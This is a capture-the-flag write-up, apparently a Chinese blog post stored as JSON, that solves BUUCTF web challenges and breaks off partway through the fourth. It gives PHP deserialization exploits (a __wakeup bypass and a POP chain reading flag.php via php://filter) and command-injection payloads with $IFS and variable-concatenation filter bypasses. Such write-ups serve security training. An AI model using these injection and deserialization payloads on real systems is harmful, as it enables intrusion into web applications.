{"title":"BUU刷题记录(2020-10-5-12)","uid":"e65725db6806e965008ebeaa6f55ead7","slug":"BUU刷题记录-2020-10-5-12","date":"2020-10-05T13:08:44.000Z","updated":"2022-01-27T11:19:59.794Z","comments":true,"path":"api/articles/BUU刷题记录-2020-10-5-12.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"0x01-极客大挑战-2019-PHP\"><a href=\"#0x01-极客大挑战-2019-PHP\" class=\"headerlink\" title=\"0x01 [极客大挑战 2019]PHP\"></a>0x01 [极客大挑战 2019]PHP</h2><p>考点：PHP反序列化</p>\n<p>上来就是一只喵，提示备份文件,试一试常见的备份格式，<a href=\"http://www.zip文件下载到本地./\">www.zip文件下载到本地。</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201005214701.png\" alt=\"目录\"></p>\n<p>解压后就这几个文件，其中index.php、flag.php、class.php才是重点，看一下都写了什么东西。</p>\n<p>index.php：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'class.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$select</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'select'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$res</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$select</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>index.php有一个传参点select，并且可以看到有一个反序列化，所以这里应该是考察反序列化。下面看一下class.php文件，它包含了flag.php文件，看看与flag有关的关键点。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">!=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>NO!!!hacker!!!&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You name is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You password is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>关键在析构函数，这里我们可以知道password的值必须要是100,username的值必须是admin，才能拿到flag。但是需要注意的点是这个Name类中有一个<code>__wakeup()</code>函数，这个会在反序列化前预加载数据，把username从admin重置为guest,不过这可以用修改序列化字符串里属性个数来绕过问题不大。</p>\n<p>exp:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'100'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$select</span> <span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$select</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201005214750.png\" alt=\"flag\"></p>\n<h2 id=\"0x02-ACTF2020-新生赛-Exec\"><a href=\"#0x02-ACTF2020-新生赛-Exec\" class=\"headerlink\" title=\"0x02 [ACTF2020 新生赛]Exec\"></a>0x02 [ACTF2020 新生赛]Exec</h2><p>考点：命令执行</p>\n<p>这题一开始的界面就是一个命令执行，直接开始试试。直接可以执行命令，用<code>;</code>来间隔命令。</p>\n<p>payload</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127.0.0.1;cat ..&#x2F;..&#x2F;..&#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201005214810.png\" alt=\"flag\"></p>\n<h2 id=\"0x03-MRCTF2020-Ezpop\"><a href=\"#0x03-MRCTF2020-Ezpop\" class=\"headerlink\" title=\"0x03 [MRCTF2020]Ezpop\"></a>0x03 [MRCTF2020]Ezpop</h2><p>考点：PHP反序列化</p>\n<p>访问环境，直接给出来index.php的源代码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag is in flag.php</span>\n<span class=\"token comment\">//WTF IS THIS?</span>\n<span class=\"token comment\">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>\n<span class=\"token comment\">//And Crack It!</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Modifier</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看一下大概有3个类Modifier类、Show类、Test类，关键结尾处的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看到了一个传入参数pop，并且php会对传入的pop参数进行unserialize操作。如果没有传入pop参数就会新建一个Show类，并且显示代码。接着看看show类，里面有两个属性，一个是source，一个是str，使用了3个魔术方法。这里重点关注一下<code>__toString()</code>、<code>__wakeup()</code>方法。这里的wakeup方法，做了一个正则匹配source的内容，并且重置source为index.php，所以如果source是对象就会调用toString方法，然后关注toString方法，这里return了一个<code>$this-&gt;str-&gt;source</code>，所以我们可以构造str为一个对象。再看Test类的魔术方法是<code>__get()</code>，那么就要一个Test类对象调用一个不可访问的属性，这就和Show类的toString方法里的返回值联动起来了，只要把str定义为Test类对象,就可以触发get方法。在get方法里面有一个返回值，把p属性作为函数执行。这也许是一个利用点，看看Modifier类里面的<code>__invoke</code>方法，当Modifier类对象被当做函数执行是会触发，执行文件包含操作，所以要触发这个文件可以在Test类里把p属性定义为Modifier类对象。</p>\n<p>POP链：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">__wakeup-&gt;__toString-&gt;__get-&gt;__invoke<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>exp:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Modifier</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=flag.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$payload</span> <span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>这里有两个Show类对象要注意，一个是一开始的Show对象，一个是用来触发__toString方法的show对象，然后要注意由于这里触发toString方法的是$b，所以pop链子的下一个Test对象应该是在$b-&gt;str里，而$a-&gt;str这是要设置为””</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201006093753.png\" alt=\"flag\"></p>\n<p>解码base64：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag&#123;7db1c9c5-6b6d-43cd-81c8-51e6a7413d12&#125;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Help Me Find FLAG!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>就可以得到flag</p>\n<h2 id=\"0x04-GXYCTF2019-Ping-Ping-Ping\"><a href=\"#0x04-GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"0x04 [GXYCTF2019]Ping Ping Ping\"></a>0x04 [GXYCTF2019]Ping Ping Ping</h2><p>考点：命令执行、外联执行、变量拼接</p>\n<p>上来就是?ping=,直接试试，可以看到目录，但是cat不了文件，会回复一个fxck your space!，看来输入是被处理了。看来是不能存在空格,还对一些符号做了过滤，例如*、’’等</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$IFS\n$&#123;IFS&#125;\n$IFS$1 \n&lt; \n&lt;&gt; \n&#123;cat,flag.php&#125;\n%20 \n%09 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>绕过过滤空格，不过很多种方式都失败了。用<code>cat$IFS$1flag.php</code>，回了一个fxck your flag! ，应该是还有什么限制，看看index.php能不能读出来,读出来后index.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span>\n<span class=\"token operator\">|</span>\\'<span class=\"token operator\">|</span>\\<span class=\"token string double-quoted-string\">\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your symbol!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your space!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bash/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your bash!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*f.*l.*a.*g.*/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your flag!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ping -c 4 \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\n\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>好家伙，过滤的挺多的,难怪刚才很多绕过方式都无法使用了，这里不能直接出现flag，可以使用变量拼接来解决：</p>\n<p>变量拼接：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ip&#x3D;127.0.0.1;a&#x3D;g;b&#x3D;a;c&#x3D;l;d&#x3D;f;cat$IFS$1$d$c$b$a.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201006105617.png\" alt=\"flag\"></p>\n<p>其他方法：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;<span aria-hidden=\"true\" 